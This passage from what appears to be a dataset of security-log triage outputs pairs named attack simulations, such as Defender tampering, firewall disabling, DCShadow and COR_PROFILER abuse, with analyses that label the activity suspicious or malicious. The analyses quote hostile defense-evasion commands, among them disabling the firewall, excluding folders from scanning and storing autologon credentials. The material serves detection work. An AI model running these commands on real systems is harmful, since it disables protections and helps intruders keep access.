4. **Validate Executables**: Confirm the legitimacy of processes executed under `admin_test` especially about unnecessary executions of `hostname.exe` and `conhost.exe` outside typical command prompts. 

Consider adding additional monitoring or controls around these activities and update security policies if needed."
WMIC Tamper with Windows Defender Evade Scanning Folder,"After analyzing the provided Windows event logs, here's a detailed assessment:

### Observed Activities:

1. **Application and Sysmon Logs**:
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, and `hostname.exe` processes being executed under the `SERVER002\admin_test` user. `wevtutil.exe` is a legitimate system utility for managing event logs, while `conhost.exe` and `hostname.exe` are legitimate console window hosts and network utility programs, respectively.
   - The execution of `cmd.exe` with the command line to run `wmic.exe` for adding an exclusion path to Windows Defender. Particularly: `wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=""file""` under the `SERVER002\admin_test` user.

2. **Sysmon Logs**:
   - The last entries show activities around `svchost.exe`, `sppsvc.exe` under system and network service contexts, which are normal system operations related to the server's background processing and service hosting.

3. **System and Security Logs**:
   - Time adjustment activities are logged in the system, showing synchronization with an external time source (`time.windows.com`), which is standard for maintaining correct system time. These are legitimate processes performed by the Windows time service (W32Time) and associated kernel processes.

### Suspicious Activities:

- **Use of `wmic.exe`**:
  - The use of `wmic.exe` to add an exclusion path in Windows Defender is particularly concerning. This could imply an attempt to evade malware detection by excluding malicious files or directories from being scanned by Windows Defender, a common tactic used in attacks.

### Assessment:

- **SUSPICIOUS**: 
  - The command to add an exclusion path in Windows Defender using `wmic.exe` requires further investigation. While other activities and processes appear standard, this operation can potentially indicate an attempt to bypass security controls which is usually not a part of normal user activity without a legitimate reason. This is often associated with malicious intent if no authorized configuration changes are documented.

### Recommendations:

1. **Further Investigation**:
   - Verify with the system administrator or relevant personnel if there was an authorized change made that involved Windows Defender configuration modifications.
   - Check if there are any other logs or alerts indicating malicious behavior or unauthorized access around the time these logs were generated.
   
2. **Containment and Analysis**:
   - If unauthorized, consider isolating the host for a detailed forensic investigation to ensure no malicious activity has been facilitated by the exclusion path.
   - Review any recent patches or updates, and reinstall Windows Defender or other protective solutions to remove any potential exclusions.

3. **Review Security Policies**:
   - Ensure policies are in place to alert on processes making significant changes to security settings, like the Defender's exclusion paths.

Based on the logs and given observations, proceed with investigating the suspicious activity to ensure the integrity and security of the Windows host in question."
Disable Microsoft Defender Firewall,"After thoroughly analyzing the provided Windows event logs, here is a detailed assessment based on identified patterns and behaviors:

### Key Observations:

1. **Time Manipulation**:
   - Several logs indicate changes in the system time. (EventID: 4616 in Security logs and EventID: 1 and 24 in System logs).
   - Specifically, the events show a ""NewTime"" being set to a time earlier than the ""OldTime"". While time corrections can occur due to system sync with NTP servers, frequent or unexplained time rollback can be a tactic to cover tracks of malicious activities.

2. **Privilege Escalation and Logons**:
   - Event 4672 in the security log indicates that the user `admin_test` was assigned high privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and more. While it is expected for admin users to have elevated privileges, this should be validated if `admin_test` is a recognized and legitimate administrative account.
   - Several 4624 events show successful logons, originating from a workstation (DESKTOP-3HL5B2P) via NTLM authentication, which may need further verification to ensure it's legitimate and recognized.

3. **Network and Firewall Configuration**:
   - A suspicious command was executed using `cmd.exe`: `""cmd.exe"" /c netsh advfirewall set currentprofile state off`. This command disables the Windows Firewall and can be a red flag indicating malicious intent to allow uninhibited network traffic or unauthorized remote access.

4. **Process Activity**:
   - The execution of typically benign utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` was noticed. While these processes themselves are not harmful, it's essential to verify the context in which these were called, particularly when preceding or following suspicious actions.

5. **Sysmon Logs and Execution Context**:
   - Sysmon logs confirmed the execution of several processes by the user `SERVER002\admin_test`, which align with patterns of reconnaissance and execution (EventID 1 and 5).

### Assessment:

- **BENIGN** actions such as regular logons and system service updates are present.
- **SUSPICIOUS** elements include the manipulation of system time and the disabling of the firewall, which require further investigation for potential unauthorized activity or misconfiguration.
- **MALICIOUS** activity is suspected due to the execution of the command that disables the firewall (`netsh advfirewall set currentprofile state off`). This is a clear indicator of compromise as disabling firewall settings without legitimate reason exposes the system to further attacks.

### Conclusion:

- **Resolution**: **MALICIOUS**
  
The logs contain definitive indicators of potential malicious activity, particularly due to the firewall disabling command. Immediate action is advised to investigate the user `admin_test`, assess the legitimacy of external logon activities, revert any unauthorized configurations, including time settings, and ensure the firewall is enabled with proper rules.

### Recommended Actions:
1. **Conduct a Full Security Audit**: Verify user accounts, particularly `admin_test`, and validate privileged uses.
2. **Review Network Configuration**: Ensure the firewall is enabled and properly configured to block unauthorized connections.
3. **Monitor for Suspicious Activity**: Set alerts for suspicious commands such as `netsh advfirewall set`, and suspicious process chains.
4. **Investigate System Time Changes**: Validate the purpose of time adjustments and ensure they're in line with expected system behavior. If unauthorized, assess the scope of changes and the intent.

By following these steps, you can establish a clear mitigation strategy and protect the system from further compromise."
UACME Bypass Method 39,"### Analysis of the Event Logs

#### Observations:
1. **Command Line Execution via `cmd.exe`:**
    - There are entries in the Sysmon logs showing `cmd.exe` being executed with a command line involving echoing paths. For instance, `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\39 Akagi64.exe`. This is the type of obfuscated command often used to execute potentially malicious files in a non-direct way.
    - Similarly, another `cmd.exe` is executed to run `Akagi64.exe` directly from a temporary folder. This is suspicious as it's common for malware to execute from temporary directories.

2. **Process Hierarchy and Parent-Child Relationships:**
    - There are processes launched by `powershell.exe` and `wsmprovhost.exe`, leading to execution of command prompt processes. The `wsmprovhost.exe` process—often associated with WMI Provider Host—used in conjunction with `cmd.exe` and Powershell can be indicative of lateral movement or remote command execution scenarios.

3. **Integrity Level:**
    - Many of these processes run at a 'High' integrity level, which indicates they are running with elevated privileges. This aligns with potential privilege escalation tactics used by attackers.

4. **Microsoft Edge Update Activities:**
    - Several entries show execution of Microsoft Edge Update processes and related services like MicrosoftEdgeUpdateComRegisterShell64.exe, logged under NT AUTHORITY\SYSTEM. These activities generally appear normal for the scheduled update process but need further scrutiny given the timing and frequency.
   
5. **Wevtutil Usage:**
    - `wevtutil.exe` found in logs suggests possible log manipulation or querying events, a common tactic seen in post-compromise scenarios to cover tracks or collect information.

#### Assessment:
- The presence of `cmd.exe` executing suspicious command lines, especially from a temporary folder location with non-standard file names, points towards potential malicious activity.
- Use of `powershell.exe` for scripting and automation tasks can indicate legitimate use, but when combined with the activity observed, it could potentially support malicious objectives.
- The combination of tools typically used by attackers (like `wevtutil.exe` and `cmd.exe` with elevated privileges) suggests that the system may have been compromised or at least needs a deeper investigation.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - While the Edge update entries appear legitimate within their context, the findings involving cmd.exe, PowerShell, and wevtutil combined with launching of non-standard executable files, warrant further investigation. Specifically, the execution of `Akagi64.exe` from a temp directory and command lines imply potential suspicious behavior that needs to be deeply looked into as possible signs of compromise.

### Guidance for Next Steps:
1. **Conduct a File Analysis:**
   - Capture the file `39 Akagi64.exe` and perform a thorough static and dynamic analysis to understand its behavior and purpose.

2. **Hunt for Persistence Mechanisms:**
   - Check for any registry keys, scheduled tasks, or startup folder entries that might have been created leveraging these scripts and executables.

3. **Network Traffic Analysis:**
   - Review network logs during the time frame of these activities to check for any anomalous outbound connections that could suggest data exfiltration or command-and-control communications.

4. **Endpoint Security Measures:**
   - Run a full scan using updated antivirus or EDR tools to detect and mitigate any potentially active threats.

5. **Review Access Logs:**
   - Scrutinize access logs and review any user account activities around these times to spot unauthorized access attempts or privilege escalation. 

These steps are aimed to either ascertain malicious intent or exonerate benign operational tasks that appear suspicious in nature."
InstallUtil class constructor method call,"Based on the provided Windows event logs, let's break down suspicious or anomalous behavior:

### Key Findings:

1. **Time Manipulation**: The logs show multiple instances where the system time was altered (`EventID: 4616`). Time changes are often used to cover tracks during malicious activity, particularly if logging or file timestamps are manipulated to confuse forensic investigations.

2. **Suspicious PowerShell Activity**: The PowerShell logs indicate the execution of a script apparently intended for testing (`InstallUtilTestHarness.ps1`) and uses environment variables (`$Env:TEMP`) targeting a temporary DLL file (`data.004.dll`). The file paths and test harness scripts can be indicative of attempts to perform actions unnoticed, possibly for persistence or privilege escalation.

3. **Executable Creation and Invocation**: The logs show commands involving `powershell.exe`, `csc.exe` (C# compiler), and `InstallUtil.exe` being used to compile and execute files within temporary directories. Typically, this pattern is consistent with malware or unwanted software installation processes.

4. **Sysmon Logs**: The logs include several `MicrosoftEdgeUpdate.exe` processes executed from temporary paths (`Program Files (x86)\\Microsoft\\Temp\\EU697E.tmp`). This could be legitimate updating activity, though spurious if not correlating with expected update windows or permissions.

5. **High Integrity and System Processes**: Some commands are executed at a high integrity level and by system-level accounts (e.g., `NT AUTHORITY\\SYSTEM`), which is consistent with attempts at privilege escalation or lateral movement.

### Assessment:
The combination and context of these events point to potential indicators of compromise. The PowerShell activity, especially with the creation and execution of a temporary DLL, is notably suspicious. Additionally, the manipulation of system time further suggests an intentional concealment of operation logs, commonly associated with malicious activity.

### Resolution:
- **SUSPICIOUS**: While the evidence strongly suggests malicious intent, variables like legitimate software installations or updates can mimic these patterns. Hence, a further detailed investigation is warranted to confirm the nature of this activity.

### Guidance:
1. **Immediate Investigation**: Identify whether the `InstallUtilTestHarness.ps1` and related temporary DLL files can be traced back to legitimate software development or internal testing. If not, consider it potential malware.

2. **Review Domain Controller Logs**: Check logs from any domain controllers to identify abnormal user behavior, particularly from the account `admin_test`.

3. **Baseline Analysis**: Compare these activities against known legitimate operations at your organization.

4. **Threat Hunting**: Utilize additional threat hunting tools to search those file hashes and command sequences through known threat databases or endpoint monitoring systems.

5. **System Integrity Checks**: Perform a system integrity check and explore any unauthorized or unexpected changes that could have been induced by these scripts.

Continuing these steps will help in confirming any breach and allow appropriate countermeasures to be enacted before any significant damage occurs."
Allow Executable Through Firewall Located in Non-Standard Location,"After carefully analyzing the provided Windows event logs from various categories (System, Application, Windows PowerShell, and Sysmon), I have identified the following points that require attention:

1. **Windows PowerShell Logs**: There's a significant PowerShell event where a script is executed to copy an executable (`fileTest.exe`) from a temporary location to the user directory and then add a firewall rule to allow inbound connections for this executable. The CommandLine shows:
   ```
   Copy-Item ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\bin\\fileTest.exe"" -Destination ""C:\\Users\\$env:UserName"" -Force
   netsh advfirewall firewall add rule name=""file Test"" dir=in action=allow program=""C:\\Users\\$env:UserName\\fileTest.exe"" enable=yes
   ```
   This behavior is highly suspicious as it indicates a script attempting to bypass security (firewall rules for inbound connections) and potentially execute unauthorized files.

2. **Sysmon Logs**: The Sysmon event logs also corroborate this PowerShell activity. Specifically:
   - Process creation related to PowerShell and `fileTest.exe`.
   - Execution of `netsh.exe` to modify firewall rules, directly aligning with the PowerShell script's activity.

3. **Other Logs**: The rest of the logs, including those from the Microsoft Edge Update process, don't indicate any direct malicious activity. The continuous logging of Edge update processes seems to be consistent with legitimate software updating behavior. 

Based on the above observations, the execution of PowerShell scripts to copy and allow traffic to an executable without clear authorization is indicative of risky behavior. 

### Assessment
- The identified activity involving PowerShell and `fileTest.exe` is **SUSPICIOUS**. It closely aligns with what could be a malicious attempt to execute and allow potentially harmful executables to communicate over the network. The use of netsh to modify firewall settings is particularly concerning without proper justification or user awareness.

### Guidance
- **Further Investigation**: Conduct a deeper investigation into the purpose and origin of the `fileTest.exe`. Determine how this script was executed, by whom, and why these particular actions were necessary.
- **Threat Hunting**: Review other systems in the network for similar activity and examine if this is part of a broader compromise.
- **Remediation**: If this activity is unauthorized, immediately revoke any rule changes made by the script, quarantine any suspicious files, and scan the system for additional signs of compromise.
- **Monitor**: Continuously monitor this and other systems for unusual PowerShell activity or firewall rule changes.

Final resolution: **SUSPICIOUS** - Activity resembling common malicious tactics requires more in-depth analysis and context assessment."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show multiple instances of `wevtutil.exe` and `conhost.exe` executing in rapid succession. While the `wevtutil.exe` command is a legitimate Windows utility for managing event logs, its frequent execution can sometimes indicate log tampering or an attempt to gather log data, especially if executed without context on a server not routinely handling such operations.
   
2. **Use of `cmd.exe` with Registry Manipulations:**
   - The `cmd.exe` is seen executing commands that modify registry settings related to `AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`. This behavior is highly suspicious as it indicates an attempt to configure automatic login potentially using existing or harvested credentials. The presence of actual registry alteration using `reg.exe` further supports the anomalous nature of this activity.

3. **Execution of `whoami.exe`:**
   - The execution of `whoami.exe`, a utility to display the user information, might be benign in isolation. However, when coupled with the other suspicious logs, it suggests someone might be attempting to gather user-context information following unauthorized access.

#### Malicious Activity or Compromise Indicators

- **Registry Manipulation:**
  - This is a strong sign of malicious activity, especially due to the changes made involving login credentials and automatic logins. This type of activity is often seen in persistence mechanisms set by malware or an adversary who needs access upon reboot.

- **Potential Privilege Escalation:**
  - The actions to change registry settings for AutoAdminLogon suggest an intention to either escalate privileges or maintain access to the server without human intervention.

#### Assessment and Threats

Based on the analysis, the logs indicate an ongoing attempt to maintain unauthorized access. The registry modifications and frequent use of system utilities (often leveraged for legitimate purposes) in a rapid sequence suggest attempts to change system configurations for persistence or surveillance.

### Resolution

**Resolution: MALICIOUS**

Given the series of log events that indicate registry manipulation to facilitate an AutoAdminLogon and potential unauthorized access, marked by the combination of tools used (`wevtutil.exe`, `cmd.exe`, `reg.exe`, and `whoami.exe`), these actions align with malicious intent.

### Guidance on How to Proceed

1. **Immediate Action:**
   - Isolate the affected system to prevent further unauthorized access.
   - Terminate any suspicious processes if still running.
   - Change passwords for any accounts that might have been exposed or abused.

2. **Deeper Investigation:**
   - Capture memory and analyze it to identify any potential malware existing in RAM.
   - Conduct a thorough review of other logs and network activity to identify threat actor activity scope.

3. **Mitigation and Remediation:**
   - Remove or rollback unauthorized changes to the registry
   - Conduct a comprehensive security audit of the account and system configurations.
   - Apply stricter monitoring for sensitive systems and ensure all logging and alerting controls are effective.

4. **Report and Recovery:**
   - Document the incident thoroughly for further analysis and root cause identification.
   - Consider involving cybersecurity experts for a detailed forensic analysis to ensure all threats are identified and neutralized."
Windows HideSCAPower Group Policy Feature,"Upon analyzing the provided Windows event logs, here is a detailed breakdown of any suspicious or malicious indicators found across the different logs:

### Application Log Analysis:
1. **Event 2383**: Indicates that the ""Software Protection Platform Service"" performed a routine activity. This is a normal operation with no apparent malicious behavior.
2. **Event 2384 & 2385**: The ""edgeupdate"" service stopping is recorded twice in quick succession. This could be due to normal service behavior, but it might warrant further investigation to ensure there is no interference or repeated failures affecting the service.

### Security Log Analysis:
1. **Events 30351 & 30352**: Both are related to the system time being changed by the `svchost.exe` process, which is a common parent process for many services. The changes are made by the `LOCAL SERVICE` account from the `NT AUTHORITY` domain. These changes appear benign, reflecting standard time synchronization activities.

### Sysmon Log Analysis:
1. **Events related to `wevtutil.exe` and `conhost.exe`**: Primarily involve the execution of standard Windows utilities (`wevtutil.exe` and `conhost.exe`) by a user account (`admin_test`). These seem routine and not inherently malicious.
2. **Event 17979 (cmd.exe execution)**:
   - This event shows `cmd.exe` executing a registry modification command that hides the SCAPower option in Explorer. Altering registry settings can sometimes be a red flag, especially if done inappropriately or maliciously.
3. **`MicrosoftEdgeUpdate.exe` Activity**: There are multiple events indicating the execution of `Microsoft Edge Update` processes:
   - These activities are consistent with legitimate update processes for Microsoft Edge. Recent execution timestamps align with a possible application update deployment.
   - Command-line arguments seen in these logs are typical for update processes.

### System Log Analysis:
1. **Kernel-General Event**: Reflects normal logs related to system time changes, which are consistent with what is observed in the Security log. These events appear to be routine and related to time synchronization mechanisms.

### Conclusion:
- The logs primarily show routine operations of Windows services like software update checks, time synchronization, and standard utilities.
- The registry modification via `cmd.exe` is the only standout event that might warrant further investigation. It could be a legitimate administrative action, but should be verified.

### Recommended Resolution:
- **Resolution**: **SUSPICIOUS**
- **Guidance**: Further investigate the source and reason behind the `cmd.exe` registry modification event to ensure it is authorized and not performed by unauthorized personnel. Simultaneously, verify the repeated stopping of the `edgeupdate` service to rule out any underlying configuration issues or unauthorized manipulation."
DCShadow (Active Directory),"### Analysis of Windows Event Logs

Upon analyzing the provided Windows event logs, I have identified several events and behaviors that indicate a potential compromise, particularly involving the use of PowerShell for typical malicious activities.

#### Key Indicators of Malicious Activity:
1. **PowerShell Script Execution:**
    - Multiple instances of `powershell.exe` were executed. The commands include a suspicious script indicative of exploitation, such as the `lsadump::dcshadow` technique, which is known for manipulating Active Directory (AD) objects via replication services.
    - The script tries to simulate a Domain Controller (DC) through `dcshadow`, targeting an object named `bruce.wayne` and altering the `badpwdcount` attribute to `9999`. This aligns with known attack techniques for malicious AD object manipulations.

2. **Process Execution and privilege escalation attempts:**
    - The activity involves `cmd.exe` starting multiple instances of an unknown script from paths within `AppData`, and `PowerShell` being launched with administrative privileges.
    - The logs show PowerShell scripts being executed with high integrity levels, indicating elevated privileges, which typically suggest an attempt at privilege escalation or persistence.

3. **Usage of PSTools and External Scripts:**
    - The PowerShell log reveals the execution of scripts stored in `Externalfiles`. The use of PSTools and unconventional paths suggests attempts to run scripts with escalated privileges and likely persistence mechanisms.

4. **Tooling reflecting Tactics, Techniques, and Procedures (TTPs):**
    - The logs show the deployment and potential triggering of scripts mimicking Domain Controller functionalities and replication tasks. These tactics align with known attacker methodologies for remaining stealthy while achieving privilege escalation or lateral movement.

5. **Execution of System and Networking Tools:**
    - Several system tools, like `wevtutil.exe`, `whoami.exe`, and network-related tools, were executed around the time of the suspicious script, which might be a part of an enumeration or cleanup task post-exploitation.

#### Assessment
The examined log entries clearly indicate the presence of attempts at manipulation and execution of potentially harmful scripts using PowerShell. The activities surrounding the fake Domain Controller setup (dcshadow attack) are particularly concerning and typical of advanced persistent threat actors targeting the domain's security infrastructure. Usage of high privileges and tools like `psh`, `cmd`, `PSTools`, and embedded paths in temporaries further corroborate this stance.

### Conclusion

   - Isolate the affected machine (`Server002`) to prevent further replication or compromise of other network assets.
   - Conduct a thorough review and restoration of AD objects and properties, especially those altered by the dcshadow technique.

2. **Forensic Investigation:**
   - Perform a detailed forensic investigation to trace the source and extent of the compromise.
   - Analyze other systems and network logs for any signs of lateral movement or additional malicious activity.

3. **Security Posture Enhancement:**
   - Review and enhance PowerShell logging along with improving visibility and alerting on anomalies.
   - Deploy advanced threat detection mechanisms that can identify and mitigate exploitation attempts on AD and privileged activities.

These steps aim to comprehensively address the identified threats and prevent recurrence through improved security measures and monitoring practices."
Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"### Analysis of Windows Event Logs

**Suspicious or Anomalous Behavior Observed:**

1. **Wevtutil and Conhost Usage:**
   - There are frequent executions of `wevtutil.exe` and `conhost.exe` within a short time frame using the `SERVER002\admin_test` account. While these are legitimate Windows files used for viewing and managing event logs and console windows, respectively, their simultaneous and repeated execution without apparent context or known administrative tasks could indicate suspicious behavior. It's essential to determine whether these actions were intended by the server administrators.

2. **Use of PowerShell to Modify Registry:**
   - The command line invocation of `powershell.exe` shows it being used to modify Registry keys related to system logon (AutoAdminLogon, DefaultUserName, DefaultDomainName, and DefaultPassword). Specifically, these changes are:
     - Setting AutoAdminLogon to 1, implying automatic login.
     - Defining a default username, domain, and password.
   - These actions are highly indicative of a potential compromise, suggesting a preparation step for persistence or unauthorized access. Storing credentials in plaintext in the Registry poses a significant security risk.

3. **Process Integrity Levels and Context:**
   - The processes run with high integrity or system level permissions, which is appropriate for maintenance tasks but concerning when paired with unusual activities like altering login settings through PowerShell.

**Indicators of Malicious Activity or Compromise:**

- The PowerShell activities that modify the Registry to enable automatic logon pose a severe security threat. This operation is possibly malicious, indicating an attempt by an attacker to maintain long-term access to the system by having the server automatically log in with administrative credentials upon reboot.

**Assessment of the Situation:**

Based on the analysis:
- **The alterations to the system’s login Registry settings using PowerShell, combined with the high integrity level at which the processes are executed, strongly suggest malicious activities.**

**Recommendations:**

1. **Alert and Respond:**
   - Immediately alert the security operations team or incident response team.
   - Isolate the affected system from the network to prevent further unauthorized access or lateral movement.

2. **Conduct a Thorough Investigation:**
   - Review user activities, especially those of the account `SERVER002\admin_test`, to determine if these actions were authorized.
   - Check system integrity and confirm if the changes made via PowerShell are unintended.
   - Assess any potential data exfiltration or further compromise that may have arisen from these actions.

3. **Remediate:**
   - Reverse or correct unauthorized changes to the system Registry, especially around AutoAdminLogon settings.
   - Rotate credentials and ensure sensitive data isn't stored insecurely.
   - Reinforce log monitoring for similar patterns across the network.

4. **Strengthen Security Posture:**
   - Implement policies restricting direct modifications to critical Registry paths.
   - Limit the use of high-level permissions to essential personnel only.
   - Enhance user training to recognize and report anomalous or unauthorized activities.

**Final Resolution: MALICIOUS**

The detected PowerShell execution involving critical Registry modifications under high integrity level strongly implies malicious intent, necessitating immediate containment and investigation."
Tamper with Windows Defender Evade Scanning -Folder,"Upon reviewing the provided event logs, several activities stand out that warrant a closer look due to their potential security implications. Here's a breakdown of the analysis:

### PowerShell Log Analysis:
1. **EventID 600**: Multiple PowerShell commands executed with `Add-MpPreference -ExclusionPath $excludedpath` to exclude the `C:\Temp` directory from Windows Defender scans.
   - **Assessment**: This action could be legitimate if it's done by an admin for maintenance purposes. However, the exclusion of directories from AV scanning is a known tactic used by attackers to evade detection.

### Application Log Analysis:
1. **edgeupdate Service**: The service stopped around the same time.
   - **Assessment**: The stopping of services can be part of regular operations, but in conjunction with other suspicious activities, it requires further scrutiny.

### Security Log Analysis:
1. **EventID 4672**: Privileged logon by the user `admin_test` with a range of high privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`.
   - **Assessment**: While privilege assignment can be routine for administrators, the presence of these specific privileges could be leveraged in a privilege escalation attack or to evade security measures.
2. **EventID 4616 (Time Change)**: Indicates that the system time was changed, which can be indicative of attempts to manipulate time stamps in logs as a method to cover tracks.

### Sysmon Log Analysis:
1. **wevtutil.exe and conhost.exe Executions**: Seen executed by `admin_test`.
   - **Assessment**: `wevtutil.exe` can interact with event logs and its use should be carefully monitored.
2. **PowerShell Process Execution**: The logs show a PowerShell process executing a command to exclude a specific path from scanning.
   - **Assessment**: This mirrors the suspicious PowerShell activity above and requires further investigation to ensure it wasn't malicious.
3. **Widespread Microsoft Edge Update Activities**: Several processes related to MicrosoftEdgeUpdate are running under `NT AUTHORITY\SYSTEM`.
   - **Assessment**: Although typical for updates, anomalies like unexpected directory locations (`C:\Program Files (x86)\Microsoft\Temp`) or atypical patterns in the update cycle may warrant further investigation.

### System Log Analysis:
1. **EventID 1 (Time Change)**: Confirmation of time changes previously noted in the security logs.
   - **Assessment**: Provides additional evidence of potential interference with system time.

### Conclusion and Resolution:
- The PowerShell command to exclude a directory from Defender and the system time changes are concerning and could potentially signal evasion or preparation for malicious activity.
- The activities, such as process executions and privileged log-ins, need to be viewed in context—anomalous and unusual patterns should be cross-referenced with known baselines for the system in question.

### Resolution: **SUSPICIOUS**
- The activities do not conclusively prove malicious intent, but they display characteristics consistent with potential compromise.
- Recommend further investigation, including:
  - Verification of the rationale behind the directory exclusion from scanning and identity of the person or script responsible.
  - Examination of the admin user’s recent activities, especially around privilege assignments and any recent changes made to system time.
  - Review the legitimacy of multiple executions of EdgeUpdate processes and their file locations. 

- It's crucial to err on the side of caution and escalate this series of events for deeper investigation to confirm or rule out malicious activities."
Masquerading - cscript.exe running as notepad.exe,"Based on the logs provided, I conducted a detailed analysis to identify any suspicious or potentially malicious activities:

### Detailed Analysis:

1. **Windows Update and Antivirus Updates:**
   - The Windows events show updates for Microsoft Defender Antivirus (KB2267602) being successfully initiated and applied (Event IDs: 44, 43, 19). This activity is standard and not inherently suspicious.

2. **Application Execution:**
   - **Common Windows Processes:** Events indicate executions of common Windows processes such as `hostname.exe`, `conhost.exe`, `whoami.exe`, and `wuauclt.exe`. These appear with standard command lines and contexts. However, frequent executions of `whoami.exe` could suggest an attempt to gather user context information, potentially leading to privilege assessment by an adversary.
   - **Command Shell Commands:**
     - Notably, a command execution involves copying 'cscript.exe' to 'notepad.exe' in the Roaming directory and executing it. This is highly unusual and indicative of masquerading, where a legitimate process (notepad.exe) is used to execute a script potentially hidden to avoid raising alarms.

3. **Observations on Potentially Malicious Activities:**
   - **Masquerading and Unusual Execution:** The renaming of `cscript.exe` to `notepad.exe` and its execution from the Roaming directory stands out as anomalous. This behavior is commonly associated with attempts to evade detection or execute payloads under the guise of legitimate applications.
   - **Repeated Shell and Console Host Processes Execution:** The frequent and chained executions of `cmd.exe`, `conhost.exe`, and the custom-named `notepad.exe` indicate potential script-based automation or attacks utilizing command-line scripting.

### Conclusion:

While most log entries concern standard system operations and updates, the observed behaviors exhibit characteristics of sophisticated malicious activity, particularly involving process masquerading (renaming of `cscript.exe` to execute as `notepad.exe`). This suggests an attempt to execute arbitrary code in a stealthy manner, raising serious security concerns.

### Final Assessment: **MALICIOUS**

The activity observed is consistent with potential compromise actions such as masquerading and unauthorized command execution. It strongly indicates malicious behavior that requires immediate investigation and potentially an incident response. 

### Recommended Actions:
1. **Immediate Investigation:** Investigate the origin and context of `cmd.exe` actions capturing details on file creation and any subsequent changes to the system.
2. **Quarantine Affected System:** Prevent potential spread and further execution by isolating the affected host from the network.
3. **Forensic Analysis and Memory Capture:** Conduct a detailed forensic review focusing on new or altered files in `AppData` and running memory analysis on `SERVER002`.
4. **Review System Permissions and Configurations:** Ensure that user accounts and scripts have their permissions correctly configured to mitigate privilege misuse.
5. **Monitor and Review Similar Systems:** Check for similar activities across other hosts in the network for wider impact assessment."
Set-Up Proxy Server,"Upon analyzing the provided Windows event logs, here are the observations:

### System Log Analysis:
1. **EventID 24 and EventID 1 from Microsoft-Windows-Kernel-General:** 
   - The logs indicate multiple updates to the system time. These time changes could be routine, such as corrections from a time server (time.windows.com), as logged by the Windows Time Service (EventID 35).
   - No explicit indication of malicious activity associated with these normal system operations is evident.

2. **Microsoft-Windows-WindowsUpdateClient:** 
   - The log indicates a routine security update for Microsoft Defender Antivirus. Again, this represents benign activity aimed at enhancing security.

### Security Log Analysis:
1. **EventID 4616:**
   - Time change events are recorded, corroborating the System log entries. These are linked to `svchost.exe` and marked under LOCAL SERVICE. While time changes can be a vector for attacks (for example, to bypass log checks), in this context, there are no indicators that these changes were unauthorized or malicious.

2. **EventID 4624 and 4672:**
   - A successful SYSTEM logon with special privileges, including sensitive ones like `SeDebugPrivilege`. This can indicate legitimate system activities, such as updates, but could also be leveraged in a suspicious context if unauthorized. However, no direct evidence of misuse is present here.

### Application Log Analysis:
- **EventID 15 from SecurityCenter:**
  - Indicates that Windows Defender is active and running, serving as a security layer.

### Sysmon Log Analysis:
1. **Process creations involving tools like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe`:**
   - These tools are observed running under the user ""SERVER002\\admin_test"". 
   - Of particular note is the `cmd.exe` process executing a command to add a proxy server registry setting. Unauthorized registry modifications, especially those dealing with network settings such as proxies, can be indicative of malicious behavior, as attackers may want to redirect or intercept network traffic.
   - Use of `whoami.exe` and `hostname.exe` can be part of legitimate scripting activities but, in conjunction with the unauthorized registry change, warrants further investigation.

2. **The `reg.exe` command:**
   - Adds a proxy setting which directly modifies user network settings, indicative of potential compromise or misconfiguration by a user/script.

### Conclusion:
The logs exhibit some benign activities such as time synchronization and Windows updates. However, the registry change related to network proxy settings via `cmd.exe` without clear authorization or context raises a red flag. This behavior is potentially suspicious as it might be used for redirections that facilitate data exfiltration or web traffic interception.

### Final Assessment: **SUSPICIOUS**

Given the suspicious activity involving proxy setting changes seen in the Sysmon logs, further investigation is recommended. Steps should include:
- Verifying the legitimacy of the proxy configuration with IT or stakeholders.
- Reviewing the user account activities associated with ""SERVER002\\admin_test"".
- Monitoring for further unauthorized changes or unusual traffic patterns following the proxy modification.

Engage IT Security teams to follow up with detailed network traffic analysis and ensure that no unauthorized access or data exfiltration is underway."
Registry-free process scope COR_PROFILER,"The logs provided contain several indicators that require detailed analysis. Let's go through each of them to determine if there is any potential malicious activity:

### Application Log
1. **.NET Runtime Error (EventID 1022)**: This log indicates a failure in loading a .NET profiler due to an error (HRESULT: 0x8007007e). This can happen due to a missing or misconfigured component. The unusual CLSID and the failed profiler attempt may indicate an attempt to inject or tamper with .NET CLR, which can be a red flag if the profiler is not known to be legitimate for the environment.

2. **Software Protection Platform Service**: Normal log activity related to software protection service.

3. **Edge Update Service Stopped**: This log isn't inherently suspicious as updates could pause services, but the frequency in such a short time might warrant a deeper look into update logs for potential tampering.

### PowerShell Log
The PowerShell logs show executed commands that include setting environment variables for COR profiling and using a PowerShell script to ""Start-Sleep 1"". These actions are being launched from paths in a temporary directory which is often suspicious. Setting the `COR_ENABLE_PROFILING` and `COR_PROFILER_PATH` to custom DLL locations can be used by attackers to execute arbitrary code via DLL side-loading or malicious profiling, which is indicative of potential malicious activities.

### Sysmon Log
1. **Process Creation**: PowerShell is being executed from paths associated with temporary directories with custom profiling settings, as noted above. This could imply an attempt to modify execution behavior potentially for code injection.

2. **Edge Update Activities**: The numerous EdgeUpdate related activities spanning several sub-processes seem excessive for a simple update and could point to a potentially unwanted application (PUA) wrapping legitimate processes for unauthorized data collection or additional payload downloads.

3. **High Integrity Level Processes**: Various processes including powershell.exe, conhost.exe, and microsoftedgeupdates setup have high integrity levels, which might imply elevated privileges and should be examined to verify they are acting within normal parameters.

### Assessment
The logs indicate suspicious behavior especially regarding PowerShell activities with profiler settings modifying runtime behavior, spawning from temporary file paths which are not standard practice. The .NET Runtime logs mentioning failed profiler loading combined with Sysmon logs of PowerShell execution from temp files repeatedly coupled with `COR_PROFILER` settings is strongly suspicious of an exploit attempt or malware activity focused on profiling subversion.

### Resolution
Based on the analysis of the logs:
- **Resolution: MALICIOUS**

